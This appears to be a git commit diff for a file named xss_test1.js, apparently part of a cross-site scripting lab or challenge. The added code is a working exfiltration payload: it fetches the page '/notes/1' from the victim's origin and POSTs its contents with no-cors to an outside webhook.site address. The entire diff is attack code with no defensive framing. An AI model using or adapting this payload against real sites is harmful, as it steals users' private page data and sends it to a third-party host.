afbca90c504a59b874afe9e41f7c904045fa8049
ivyang0211 <evelynang0211@gmail.com>
2025-04-25 12:38:46 +0700

    xss_test1.js

--- xss_test1.js
+++ xss_test1.js
@@ -1,1 +1,7 @@
-fetch('https://webhook.site/2a4e63aa-4297-40aa-a983-46ee14dc0f24')
+fetch('/notes/1')
+.then(r => r.text())
+.then(d => fetch('https://webhook.site/2a4e63aa-4297-40aa-a983-46ee14dc0f24', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: d
+}))
